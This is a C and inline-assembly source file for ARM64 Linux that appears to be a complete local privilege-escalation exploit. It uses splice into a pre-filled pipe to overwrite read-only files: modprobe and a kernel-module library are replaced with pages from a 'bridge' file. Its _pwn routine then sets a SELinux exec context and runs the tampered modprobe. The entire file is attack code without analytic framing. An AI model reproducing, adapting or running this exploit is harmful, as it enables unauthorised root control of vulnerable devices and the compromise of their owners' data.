#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>

#include <asm/unistd.h>
#include <asm/stat.h>
#include <linux/un.h>
#include <sys/socket.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#define __asm_syscall(...) do { \
	__asm__ __volatile__ ( "svc 0" \
	: "=r"(x0) : __VA_ARGS__ : "memory", "cc"); \
	return x0; \
	} while (0)

static inline long __syscall0(long n) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0");
    __asm_syscall("r"(x8));
}

static inline long __syscall1(long n, long a) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    __asm_syscall("r"(x8), "0"(x0));
}

static inline long __syscall2(long n, long a, long b) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm_syscall("r"(x8), "0"(x0), "r"(x1));
}

static inline long __syscall3(long n, long a, long b, long c) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm_syscall("r"(x8), "0"(x0), "r"(x1), "r"(x2));
}

static inline long __syscall4(long n, long a, long b, long c, long d) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm_syscall("r"(x8), "0"(x0), "r"(x1), "r"(x2), "r"(x3));
}

static inline long __syscall5(long n, long a, long b, long c, long d, long e) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e;
    __asm_syscall("r"(x8), "0"(x0), "r"(x1), "r"(x2), "r"(x3), "r"(x4));
}

static inline long __syscall6(long n, long a, long b, long c, long d, long e, long f) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e;
    register long x5 __asm__("x5") = f;
    __asm_syscall("r"(x8), "0"(x0), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5));
}

static inline long _fcntl(unsigned int __fd, unsigned int __cmd, unsigned long __arg) {
    return __syscall3(__NR_fcntl, __fd, __cmd, __arg);
}

static inline long _close(unsigned int __fd) {
    return __syscall1(__NR_close, __fd);
}

static inline long _write(int __fd, const void * __buf, size_t __count) {
    return (int) __syscall3(__NR_write, __fd, (long) __buf, __count);
}

static inline ssize_t _read(int __fd, void * __buf, size_t __count) {
    return __syscall3(__NR_read, __fd, (long) __buf, (long)__count);
}

static inline ssize_t _lseek(int __fd, off_t __offset, int __whence) {
    return __syscall3(__NR_lseek, __fd, __offset, __whence);
}

static inline ssize_t _fstat(int __fd, struct stat * __statbuf) {
    return __syscall2(__NR_fstat, __fd, (long) __statbuf);
}

static inline int _openat(const char * __path, int __flags, int __mode) {
    return __syscall4(__NR_openat, AT_FDCWD, (long) __path, __flags, __mode);
}

static inline ssize_t _splice(int __in_fd, off64_t * __in_offset, int __out_fd, off64_t * __out_offset, size_t __length, unsigned int __flags) {
    return __syscall6(__NR_splice, __in_fd, (long) __in_offset, __out_fd, (long) __out_offset, __length, __flags);
}

static inline int _execve(const char * __filename, const char * const * __argv, const char * const * __envp) {
    return __syscall3(__NR_execve, (long) __filename, (long) __argv, (long) __envp);
}

static inline int _pipe(int __fds[2]) {
    return __syscall2(__NR_pipe2, (long) __fds, 0);
}

static inline int _s_exit(int __status) {
    return __syscall1(__NR_exit, __status);
}

static inline void prepare_pipe(int p[2]) {
    _pipe(p);

    const unsigned pipe_size = _fcntl(p[1], F_GETPIPE_SZ, 0);
    const char buffer[PAGE_SIZE];

    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        _write(p[1], buffer, n);
        r -= n;
    }

    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        _read(p[0], buffer, n);
        r -= n;
    }
}

static inline int overwrite(int p[2], int fd, loff_t offset, const char * data, int data_size) {
    _lseek(fd, 0, SEEK_SET);

    --offset;
    loff_t nbytes = _splice(fd, &offset, p[1], NULL, 1, 0);

    if (nbytes < 0) {
        return -1;
    }

    if (nbytes == 0) {
        return -1;
    }

    nbytes = _write(p[1], data, data_size);
    if (nbytes < 0) {
        return -1;
    }
    if ((size_t) nbytes < data_size) {
        return -1;
    }

    return 0;
}

int _pwn() {
    __asm__("adr x1, _modprobe");
    register char * modprobe asm ("x1");
    const int fd_mp = _openat(modprobe, 0, 0);
    __asm__("adr x1, _ko_lib");
    register char * ko_lib asm ("x1");
    const int fd_ko = _openat(ko_lib, 0, 0);
    __asm__("adr x1, _bridge");
    register char * bridge asm ("x1");
    const int fd_bridge = _openat(bridge, 0, 0);

    int p[2];
    prepare_pipe(p);

    const char buffer[PAGE_SIZE];
    _lseek(fd_bridge, PAGE_SIZE + 1, 0);
    _read(fd_bridge, buffer, PAGE_SIZE);

    overwrite(p, fd_mp, 1, buffer, PAGE_SIZE - 1);

    for (int i=0;i<4;i++) {
        _lseek(fd_bridge, (PAGE_SIZE * (i + 2)) + 1, 0);
        _read(fd_bridge, buffer, PAGE_SIZE);
        overwrite(p, fd_ko, i * PAGE_SIZE + 1, buffer, PAGE_SIZE - 1);
    }

    __asm__("adr x1, _exec_attr;");
    register char * exec_path asm ("x1");
    int f = _openat(exec_path, 2, 0);

    __asm__("adr x1, _modprobe_context;");
    register char * selinux_context asm ("x1");
    _write(f, selinux_context, 22);
    _close(f);

    __asm__("adr x0, _modprobe;");
    register char * e asm ("x0");
    _execve(e, NULL, NULL);

    return _s_exit(0);
}

int main(int argc, char ** argv) {
    asm(".include \"init.S\";");
}
